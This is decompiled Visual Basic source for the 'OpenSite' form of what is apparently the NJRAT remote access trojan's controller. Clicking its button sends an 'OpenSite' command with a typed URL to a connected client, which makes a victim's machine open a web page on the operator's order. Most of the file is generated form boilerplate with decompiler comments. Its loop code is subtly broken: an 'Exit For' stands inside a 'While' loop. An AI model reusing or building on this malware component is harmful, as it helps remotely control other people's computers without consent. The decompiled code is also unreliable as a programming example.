Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x0200001F RID: 31
	<DesignerGenerated()>
	Public Partial Class OpenSite
		Inherits Form

		' Token: 0x06000445 RID: 1093 RVA: 0x0016CA28 File Offset: 0x0016AE28
		<DebuggerNonUserCode()>
		Public Sub New()
			OpenSite.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000446 RID: 1094 RVA: 0x0016CA40 File Offset: 0x0016AE40
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = OpenSite.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = OpenSite.__ENCList.Count = OpenSite.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = OpenSite.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = OpenSite.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								OpenSite.__ENCList(num) = OpenSite.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					OpenSite.__ENCList.RemoveRange(num, OpenSite.__ENCList.Count - num)
					OpenSite.__ENCList.Capacity = OpenSite.__ENCList.Count
				End If
				OpenSite.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000189 RID: 393
		' (get) Token: 0x06000449 RID: 1097 RVA: 0x0016CE9C File Offset: 0x0016B29C
		' (set) Token: 0x0600044A RID: 1098 RVA: 0x0016CEB4 File Offset: 0x0016B2B4
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x1700018A RID: 394
		' (get) Token: 0x0600044B RID: 1099 RVA: 0x0016CEC0 File Offset: 0x0016B2C0
		' (set) Token: 0x0600044C RID: 1100 RVA: 0x0016CED8 File Offset: 0x0016B2D8
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700018B RID: 395
		' (get) Token: 0x0600044D RID: 1101 RVA: 0x0016CEE4 File Offset: 0x0016B2E4
		' (set) Token: 0x0600044E RID: 1102 RVA: 0x0016CEFC File Offset: 0x0016B2FC
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x0600044F RID: 1103 RVA: 0x0016CF5C File Offset: 0x0016B35C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("OpenSite", MyProject.Forms.Form1.Yy), Me.TextBox1.Text) }, Nothing, Nothing, Nothing, True)
		End Sub

		' Token: 0x040001FC RID: 508
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001FE RID: 510
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001FF RID: 511
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000200 RID: 512
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000201 RID: 513
		Public s As Client
	End Class
End Namespace
